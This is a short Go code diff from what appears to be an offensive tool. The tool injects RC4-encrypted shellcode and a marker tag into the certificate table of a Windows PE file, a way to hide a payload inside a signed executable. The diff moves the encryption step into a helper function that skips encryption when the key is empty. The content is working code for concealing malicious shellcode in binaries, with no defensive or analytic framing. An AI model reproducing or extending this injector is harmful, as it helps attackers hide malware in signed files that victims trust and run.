@@ -64,6 +64,19 @@ func GetCertTableOffset(fileBytes []byte) uint64 {
 	return ntHeaderOffset + certTblOffsetFromNtHeader
 }
 
+func encryptShellcode(shellcode []byte, rc4key []byte) (data []byte, err error) {
+	if len(rc4key) <= 0 {
+		return shellcode, nil
+	}
+	rc4Cipher, err := rc4.NewCipher(rc4key)
+	if err != nil {
+		return nil, err
+	}
+	data = make([]byte, len(shellcode))
+	rc4Cipher.XORKeyStream(data, shellcode)
+	return
+}
+
 // Inject tag and shellcode to pe cert table, tag length must be at least 8
 func Inject(fr io.Reader, shellcode []byte, tag []byte, rc4key []byte) (newFileBytes []byte, err error) {
 	if len(tag) < 8 {
@@ -77,12 +90,10 @@ func Inject(fr io.Reader, shellcode []byte, tag []byte, rc4key []byte) (newFileB
 	}
 
 	// RC4 encrypt and Tag
-	rc4Cipher, err := rc4.NewCipher(rc4key)
+	encryptedShellcode, err := encryptShellcode(shellcode, rc4key)
 	if err != nil {
 		return
 	}
-	encryptedShellcode := make([]byte, len(shellcode))
-	rc4Cipher.XORKeyStream(encryptedShellcode, shellcode)
 	encryptedData := append(tag, encryptedShellcode...)
 
 	// Adjust extra padding
